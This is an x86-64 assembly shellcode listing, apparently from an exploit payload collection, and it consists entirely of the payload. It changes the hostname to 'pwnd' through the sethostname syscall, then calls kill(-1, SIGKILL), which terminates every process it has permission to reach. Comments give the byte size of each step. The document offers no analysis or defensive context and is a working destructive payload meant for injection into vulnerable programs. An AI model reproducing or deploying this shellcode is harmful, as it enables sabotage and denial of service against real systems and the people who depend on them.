section .text
    global _start
_start:
;-- setHostName("pwnd"); 17 bytes --;
    mov     sil, 0xaa
    push    'pwnd'
    mov     rdi, rsp
    mov     al, 0x08
    xchg    rax, rsi
    syscall
;-- kill(-1, SIGKILL); 15 bytes --;
    push    byte 0x3e
    pop     rdi
    push    byte 0xff
    pop     rsi
    push    byte 0x9
    pop     rax
    xchg    rsi, rax
    xchg    rax, rdi
    syscall
